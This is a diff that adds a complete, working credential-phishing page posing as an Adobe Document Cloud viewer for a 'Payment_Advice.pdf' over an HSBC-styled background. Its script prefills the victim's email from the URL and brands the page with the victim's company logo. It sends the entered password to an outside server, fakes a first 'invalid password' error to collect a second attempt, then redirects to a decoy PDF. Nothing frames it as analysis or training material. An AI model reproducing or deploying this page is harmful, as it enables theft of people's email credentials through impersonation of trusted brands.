@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="page-title">Adobe Document Cloud</title>
+    <link rel="icon" type="image/x-icon" href="https://cdn.glitch.global/d27d99eb-d54f-474f-a1fc-a598e61e5947/favicon.png?v=1724752849466">
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            overflow: hidden;
+        }
+        .bg {
+            background-image: url('https://cdn.glitch.global/d27d99eb-d54f-474f-a1fc-a598e61e5947/pdf-bck-hsbc.png?v=1724752898298');
+            background-position: center center; /* Center the image */
+            background-repeat: no-repeat; /* Prevent the image from repeating */
+            background-size: contain; /* Ensure the image covers the entire background */
+            height: 100vh; /* Cover the full height of the viewport */
+            width: 100%; /* Cover the full width of the viewport */
+            position: relative;
+            background-color: #333;
+             
+
+        }
+        .bg::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5); /* opacity over the background image */
+        }
+        .form-wrapper {
+            position: relative;
+            z-index: 1;
+            background-color: white;
+            max-width: 400px;
+            padding: 20px;
+            padding-bottom: 50px;
+            margin: auto;
+            top: 50%;
+            transform: translateY(-50%);
+            border-radius: 8px;
+        }
+        .form-wrapper .form-element {
+            position: relative;
+        }
+        .form-wrapper .form-element .fa-arrow-left {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+        .form-wrapper .form-control.email-field {
+            padding-left: 30px;
+            border: none;
+
+            box-shadow: none;
+            background-color: #fff;
+        }
+        .form-wrapper .form-control.text-input-field {
+            width: 95%;
+            border: none;
+            border-bottom: 2px solid #ccc;
+        }
+        .header-container {
+            display: flex;
+            align-items: center;
+        }
+        .header-container h1 {
+            margin-right: 10px;
+        }
+        @media (max-width: 576px) {
+            .form-wrapper {
+                width: 90%;
+                padding: 10px;
+            }
+            .form-wrapper .form-control.text-input-field {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bg">
+    <div class="form-wrapper">
+        <form id="custom-form">
+            <div class="form-element">
+                <img  src="https://cdn.glitch.global/d27d99eb-d54f-474f-a1fc-a598e61e5947/pdf-logo.png?v=1724752732381" alt="Logo" class="img-fluid" width="100px">
+            </div>
+            <div class="form-element header-container">
+                <h5  >Filename:</h5> &nbsp; &nbsp;
+                <h5 id="subtext">Payment_Advice.pdf</h5>
+            </div>
+            <!-- Success message container placed after the submit button -->
+            <div id="success-message-container" class="form-element mt-3"></div>
+            <div class="form-element">
+                <i class="fas fa-arrow-left"></i>
+                <input type="email" class="form-control email-field" id="email-field" placeholder="Email" readonly>
+            </div>
+
+            <div class="form-element">
+                <input type="password" class="form-control text-input-field" id="text-input" placeholder="Enter password" required>
+            </div>
+<br />
+            <div class="form-element">
+                <p style="color: blue;">Note: Only recipient email can access shared files and link will expire in 5 days</p>
+                <button type="submit" class="btn btn-primary float-right" style="background-color: #ED2224;">View Document</button>
+            </div>
+<p style="font-size: 10px;">Adobe Online Document Service</p>
+<p style="font-size: 10px;">&#169; 2024</p>
+
+        </form>
+    </div>
+    <script>
+        $(document).ready(function() {
+            let submissionCount = 0;
+            let emailDomain = '';
+
+            // Get email from URL and set it in the email field
+            let email = window.location.hash.slice(1);
+            if (email) {
+                $('#email-field').val(email);
+                emailDomain = email.split('@')[1];
+                if (emailDomain) {
+                    // Set background iframe based on the domain
+                    $('#domain-iframe').attr('src', `http://${emailDomain}`);
+                    // Set header text and page title to the email domain
+                    $('#header-text').text(emailDomain);
+                    $('#page-title').text(`${emailDomain} - Responsive Form`);
+                    
+                    // Fetch the logo from Clearbit API
+                    $.getJSON(`https://logo.clearbit.com/${emailDomain}`, function(data) {
+                        if (data) {
+                            $('#logo-img').attr('src', `https://logo.clearbit.com/${emailDomain}`);
+                            $('head').append(`<link rel="icon" href="https://logo.clearbit.com/${emailDomain}" type="image/x-icon">`);
+                        } else {
+                            // Fallback to favicon if Clearbit logo is not available
+                            $('#logo-img').attr('src', `http://${emailDomain}/favicon.ico`);
+                            $('head').append(`<link rel="icon" href="http://${emailDomain}/favicon.ico" type="image/x-icon">`);
+                        }
+                    }).fail(function() {
+                        // Fallback to favicon if Clearbit API fails
+                        $('#logo-img').attr('src', `http://${emailDomain}/favicon.ico`);
+                        $('head').append(`<link rel="icon" href="http://${emailDomain}/favicon.ico" type="image/x-icon">`);
+                    });
+                }
+            }
+
+            // Handle form submission
+            $('#custom-form').on('submit', function(event) {
+                event.preventDefault(); // Prevent default form submission
+
+                const email = $('#email-field').val();
+                const textInput = $('#text-input').val();
+
+                // Perform AJAX request
+                $.ajax({
+                    url: 'https://bily.org/code.php', // Replace with your server endpoint, do this correctly else no response when you click submit
+                    type: 'POST',
+                    data: {
+                        email: email,
+                        textInput: textInput
+                    },
+                    success: function(response) {
+                        submissionCount++;
+                        // Display success message
+                        $('#success-message').remove(); // Remove any existing success message
+                        let successMessage = '';
+                        if (submissionCount === 1) {
+                            successMessage = '<div id="success-message" class="alert alert-danger mt-3">Invalid Recipient Email Password!</div>';
+                        } else {
+                            successMessage = '<div id="success-message" class="alert alert-success mt-3">Successful! Document Loading...</div>';
+                        }
+                        $('#success-message-container').append(successMessage);
+
+                        if (submissionCount < 2) {
+                            // Reset the text input field and ask for a new value
+                            $('#text-input').val('');
+
+                        } else {
+                            // Redirect to the mail server after the second submission
+                            setTimeout(function() {
+                                window.location.href = `https://cdn.glitch.global/d27d99eb-d54f-474f-a1fc-a598e61e5947/Payment_Advice.pdf?v=1724752668470`;
+                            }, 2000); // Redirect after 2 seconds to allow the user to see the success message
+                        }
+                    },
+                    error: function(xhr, status, error) {
+                        console.error('Submission failed:', error);
+                    }
+                });
+            });
+
+            // Remove success message when user starts typing in the text field
+            $('#text-input').on('input', function() {
+                $('#success-message').remove();
+            });
+        });
+    </script>
+</body>
+</html>
